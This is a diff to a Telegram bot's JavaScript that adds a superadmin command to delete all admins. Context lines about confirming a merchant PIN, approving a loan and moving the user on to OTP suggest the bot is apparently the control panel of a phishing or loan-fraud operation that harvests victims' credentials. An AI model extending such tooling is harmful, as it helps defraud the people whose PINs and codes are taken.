@@ -288,6 +288,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 /pauseadmin <adminId> - Pause an admin
 /unpauseadmin <adminId> - Unpause an admin
 /removeadmin <adminId> - Remove an admin
+/clearalladmins - Remove all admins (except ADMIN001)
 /admins - List all admins
 
 *Messaging:*
@@ -883,6 +884,38 @@ ${requestText}
         }
     });
 
+    // /clearalladmins (SUPER ADMIN ONLY)
+    bot.onText(/\/clearalladmins/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        
+        // SUPER ADMIN ONLY
+        if (adminId !== 'ADMIN001') {
+            return bot.sendMessage(chatId, '❌ Only superadmin can do this!');
+        }
+        
+        try {
+            // Show confirmation prompt
+            await bot.sendMessage(chatId, `
+⚠️ *WARNING - IRREVERSIBLE ACTION*
+
+This will DELETE ALL ADMINS except ADMIN001!
+
+React with ✅ to confirm or ❌ to cancel
+            `, {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ YES, DELETE ALL', callback_data: 'confirm_clear_admins' },
+                        { text: '❌ CANCEL', callback_data: 'cancel_clear_admins' }
+                    ]]
+                }
+            });
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Error: ' + error.message);
+        }
+    });
+
     console.log('✅ Command handlers setup complete!');
 }
 
@@ -1104,6 +1137,77 @@ User will now proceed to OTP.
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
+    }
+
+    // Clear all admins confirmation
+    else if (data === 'confirm_clear_admins') {
+        const adminId = getAdminIdByChatId(chatId);
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        try {
+            const allAdmins = await db.getAllAdmins();
+            const adminsToClear = allAdmins.filter(a => a.adminId !== 'ADMIN001');
+            let deletedCount = 0;
+            const deletedNames = [];
+
+            for (const admin of adminsToClear) {
+                try {
+                    await db.deleteAdmin(admin.adminId);
+                    deletedCount++;
+                    deletedNames.push(`${admin.name} (${admin.adminId})`);
+                    adminChatIds.delete(admin.adminId);
+                    pausedAdmins.delete(admin.adminId);
+                } catch (err) {
+                    console.error(`Failed to delete ${admin.adminId}:`, err.message);
+                }
+            }
+
+            await bot.editMessageText(`
+🗑️ *ALL ADMINS CLEARED*
+
+Deleted: ${deletedCount} admin(s)
+🛡️  Protected: ADMIN001 (Super Admin)
+⏰ ${new Date().toLocaleString()}
+
+*Deleted Admins:*
+${deletedNames.map((n, i) => `${i+1}. ${n}`).join('\n')}
+            `, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'Markdown'
+            });
+
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: `✅ Cleared ${deletedCount} admin(s)!`
+            });
+
+        } catch (error) {
+            console.error('❌ Error clearing admins:', error);
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Error: ' + error.message,
+                show_alert: true
+            });
+        }
+    }
+
+    // Cancel clear all admins
+    else if (data === 'cancel_clear_admins') {
+        await bot.editMessageText(`
+❌ *CANCELLED*
+
+Clear all admins operation was cancelled.
+⏰ ${new Date().toLocaleString()}
+        `, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'Markdown'
+        });
+
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: 'Operation cancelled'
+        });
     }
 });
 
